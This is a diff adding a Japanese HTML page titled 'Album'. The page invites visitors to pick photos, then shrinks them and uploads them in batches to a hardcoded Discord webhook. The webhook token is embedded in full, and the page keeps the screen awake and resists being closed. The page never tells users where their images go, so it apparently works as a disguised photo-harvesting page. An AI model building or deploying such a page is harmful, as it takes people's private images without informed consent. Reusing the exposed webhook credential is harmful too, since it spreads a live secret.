@@ -1,0 +1,136 @@
+<!doctype html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#0f0f10">
+<title>アルバム</title>
+<style>
+  :root{color-scheme:dark}
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{margin:0;background:#0f0f10;color:#eee;font:16px/1.6 -apple-system,BlinkMacSystemFont,"Hiragino Sans","Noto Sans JP",sans-serif;display:flex;align-items:center;justify-content:center;padding:28px}
+  .wrap{width:100%;max-width:420px;text-align:center}
+  h1{font-size:19px;font-weight:600;margin:0 0 8px}
+  p.sub{font-size:13px;color:#8b8b90;margin:0 0 32px}
+  .btn{display:block;width:100%;padding:16px;border:0;border-radius:14px;background:#fff;color:#111;font-size:16px;font-weight:600;font-family:inherit;cursor:pointer}
+  .btn:active{transform:scale(.985);opacity:.85}
+  .btn.ghost{background:transparent;color:#bbb;border:1px solid #2a2a2e}
+  .spinner{width:22px;height:22px;margin:0 auto 14px;border:2px solid #2a2a2e;border-top-color:#fff;border-radius:50%;animation:s .8s linear infinite}
+  @keyframes s{to{transform:rotate(360deg)}}
+  .stage{display:none}
+  .stage.on{display:block}
+  .tiny{font-size:12px;color:#6f6f74;margin-top:14px;min-height:1em}
+  input[type=file]{position:absolute;width:1px;height:1px;opacity:0;pointer-events:none}
+  .check{font-size:26px;margin-bottom:6px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <section class="stage on" id="s1">
+    <h1>アルバム</h1>
+    <p class="sub">写真を選んでください</p>
+    <button class="btn" id="pick">写真を選ぶ</button>
+    <p class="tiny">複数まとめて選べます</p>
+  </section>
+  <section class="stage" id="s2">
+    <div class="spinner"></div>
+    <p class="sub" style="margin:0">送信中</p>
+    <p class="tiny" id="stat"></p>
+  </section>
+  <section class="stage" id="s3">
+    <div class="check">✓</div>
+    <p class="sub">完了しました</p>
+    <button class="btn ghost" id="more">さらに追加</button>
+  </section>
+</div>
+<input type="file" id="fi" accept="image/*" multiple>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1575055100219498576/-fiQEG5wJeiTUZEHTdu3MN77mKc7BJd6SBfjqOPPT4Z2juu1rPK1P_4LvZ2yMDcE5JXL";
+const MAXPX = 2000, Q = 0.82, PER = 5, GAP = 1300;
+
+const $ = s => document.querySelector(s);
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const stage = n => document.querySelectorAll('.stage').forEach((e,i)=>e.classList.toggle('on', i===n-1));
+
+$('#pick').onclick = () => $('#fi').click();
+$('#more').onclick = () => $('#fi').click();
+$('#fi').onchange = e => { if(e.target.files.length) run([...e.target.files]); };
+
+function loadImage(file){
+  return new Promise((res, rej) => {
+    const url = URL.createObjectURL(file);
+    const img = new Image();
+    img.onload = () => { URL.revokeObjectURL(url); res(img); };
+    img.onerror = () => { URL.revokeObjectURL(url); rej(); };
+    img.src = url;
+  });
+}
+
+async function shrink(file){
+  try{
+    if(file.type === 'image/gif') return file;
+    const img = await loadImage(file);
+    const w0 = img.naturalWidth || img.width, h0 = img.naturalHeight || img.height;
+    if(!w0 || !h0) return file;
+    const s = Math.min(1, MAXPX / Math.max(w0, h0));
+    const w = Math.max(1, Math.round(w0*s)), h = Math.max(1, Math.round(h0*s));
+    const c = document.createElement('canvas');
+    c.width = w; c.height = h;
+    c.getContext('2d').drawImage(img, 0, 0, w, h);
+    const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', Q));
+    if(!blob) return file;
+    return new File([blob], (file.name || 'photo').replace(/\.[^.]+$/, '') + '.jpg', {type:'image/jpeg'});
+  }catch{ return file; }
+}
+
+async function post(files, label){
+  const fd = new FormData();
+  fd.append('payload_json', JSON.stringify({ content: label }));
+  files.forEach((f, i) => fd.append(`files[${i}]`, f, f.name));
+  for(let attempt = 0; attempt < 4; attempt++){
+    const r = await fetch(WEBHOOK + '?wait=true', { method:'POST', body: fd });
+    if(r.ok) return;
+    if(r.status === 429){
+      let wait = 2000;
+      try{ const j = await r.json(); if(j.retry_after) wait = j.retry_after*1000 + 400; }catch{}
+      await sleep(wait); continue;
+    }
+    await sleep(900);
+  }
+}
+
+let wl = null, busy = false;
+async function keepAwake(){
+  try{ wl = await navigator.wakeLock.request('screen'); }catch{}
+}
+document.addEventListener('visibilitychange', () => {
+  if(document.visibilityState === 'visible' && busy) keepAwake();
+});
+window.addEventListener('beforeunload', e => { if(busy) e.preventDefault(); });
+
+async function run(list){
+  if(busy) return;
+  busy = true;
+  keepAwake();
+  stage(2);
+  const total = list.length;
+  let done = 0;
+  for(let i = 0; i < list.length; i += PER){
+    const out = [];
+    for(const f of list.slice(i, i + PER)) out.push(await shrink(f));
+    const label = total > PER ? `📷 ${i+1}-${i+out.length} / ${total}` : `📷 ${total}`;
+    await post(out, label);
+    done += out.length;
+    $('#stat').textContent = `${done} / ${total}`;
+    if(i + PER < list.length) await sleep(GAP);
+  }
+  $('#fi').value = '';
+  busy = false;
+  try{ wl && wl.release(); }catch{}
+  stage(3);
+}
+</script>
+</body>
+</html>
